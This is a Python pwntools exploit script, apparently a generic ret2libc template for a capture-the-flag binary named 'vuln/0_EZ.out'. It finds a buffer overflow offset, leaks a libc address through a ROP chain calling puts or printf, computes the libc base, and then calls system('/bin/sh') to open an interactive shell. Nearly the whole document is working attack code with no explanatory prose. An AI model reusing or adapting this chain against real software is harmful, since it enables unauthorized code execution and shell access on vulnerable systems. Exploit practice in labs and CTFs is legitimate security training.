#!/usr/bin/env python
 
import sys
#from struct import pack
from pwn import *

LOCAL_BIN = 'vuln/0_EZ.out'
context.binary = elf = ELF(LOCAL_BIN)
LIBC = ELF("vuln/libc.so.6") #elf.libc ELF("/lib/x86_64-linux-gnu/libc.so.6") #Set library path when know it
ENV = {"LD_PRELOAD": LIBC.path} if LIBC else {}

##########################
##### OFFSET FINDER ######
##########################
with log.progress("Finding offset"):
    p = process(LOCAL_BIN)
    p.recvuntil(b'in> ')

    payload = cyclic(300)
    p.sendline(payload)
    p.wait()
    
    core = p.corefile
    offset = cyclic_find(p64(core.fault_addr))
    
log.success(f"Finding offset at {offset}")

#####################
#### Find Gadgets ###
#####################
try:
    libc_func = "puts"
    PUTS_PLT = elf.plt['puts'] #PUTS_PLT = elf.symbols["puts"] # This is also valid to call puts
except:
    libc_func = "printf"
    PUTS_PLT = elf.plt['printf']

MAIN_PLT = elf.symbols['main']
rop = ROP(elf)
POP_RDI = (rop.find_gadget(['pop rdi', 'ret']))[0] #Same as ROPgadget --binary vuln | grep "pop rdi"
RET = (rop.find_gadget(['ret']))[0]

log.info("Main start: " + hex(MAIN_PLT))
log.info(f"{libc_func=}")
log.info("Puts plt: " + hex(PUTS_PLT))
log.info("pop rdi; ret  gadget: " + hex(POP_RDI))
log.info("ret gadget: " + hex(RET))

#########################
#### Find LIBC offset ###
#########################
p = process(LOCAL_BIN, env=ENV, stdin=process.PTY)
#p = process(LOCAL_BIN)
with log.progress("Finding libc base"):
    FUNC_GOT = elf.got[libc_func]
    log.info(libc_func + " GOT @ " + hex(FUNC_GOT))

    #rop1 = p64(POP_RDI) + p64(FUNC_GOT) + p64(PUTS_PLT) + p64(MAIN_PLT)
    rop.raw(RET)
    rop.call(libc_func, [FUNC_GOT])
    rop.main()

    log.info(f"Len ropChain: {len( fit({ offset: rop.chain()}) )}")

    print(p.clean()) # clean socket buffer (read all and print)
    p.sendline(fit({ offset: rop.chain()} ))

    leak = p.recvline().strip()
    leak = u64(leak.ljust(8, b'\x00'))
    log.info(f"Leaked LIBC address,  {libc_func}: {hex(leak)}")

    # Set lib base address
    if LIBC:
        LIBC.address = leak - LIBC.symbols[libc_func] #Save LIBC base
        print("If LIBC base doesn't end end 00, you might be using an icorrect libc library")
        log.info("LIBC base @ %s" % hex(LIBC.address))

    # If not LIBC yet, stop here
    else:
        print("TO CONTINUE) Find the LIBC library and continue with the exploit... (https://LIBC.blukat.me/)")
        p.interactive()


##############################
##### FINAL EXPLOITATION #####
##############################
def get_one_gadgets(libc):
    import string, subprocess
    args = ["one_gadget", "-r"]
    if len(libc) == 40 and all(x in string.hexdigits for x in libc.hex()):
        args += ["-b", libc.hex()]
    else:
        args += [libc]
    try:
        one_gadgets = [int(offset) for offset in subprocess.check_output(args).decode('ascii').strip().split()]
    except:
        print("One_gadget isn't installed")
        one_gadgets = []
    return one_gadgets



BINSH = next(LIBC.search(b'/bin/sh\x00'))	# $strings -a -t x ./libc.so.6 | grep /bin/sh
SYSTEM = LIBC.symbols['system']		# $readelf -s ./libc.so.6 | grep system
EXIT = LIBC.sym["exit"]
log.info("bin/sh %s " % hex(BINSH))
log.info("system %s " % hex(SYSTEM))
log.info("exit %s " % hex(EXIT))

rop = ROP([LIBC, elf])

rop.raw(RET)
rop.call("system", [BINSH])
rop.raw(EXIT)
#print(rop.dump())
log.info(f"Len ropChain: {len( fit({ offset: rop.chain()}) )}")

print(p.clean()) # clean socket buffer (read all and print)
p.sendline(fit({ offset: rop.chain()} ))
p.interactive()
